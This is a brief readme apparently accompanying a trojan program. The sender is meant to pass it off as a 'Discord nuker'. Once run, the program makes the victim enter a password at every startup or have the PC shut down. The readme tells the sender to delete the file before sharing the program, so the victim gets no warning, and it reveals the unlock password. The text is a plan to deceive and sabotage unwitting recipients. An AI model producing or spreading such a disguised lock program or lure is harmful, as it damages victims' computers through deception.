This is a very cool trick.
You can send this to anybody and say it`s a Discord nuker.(it is)
But when they start the nuker, everytime they start they´re pc they have to enter a password
to continue.
If they don´t do that, they´re Pc gets shutdown.
If you want to send this to anyone , delete this file.
(also the password is isilpsmsic3t)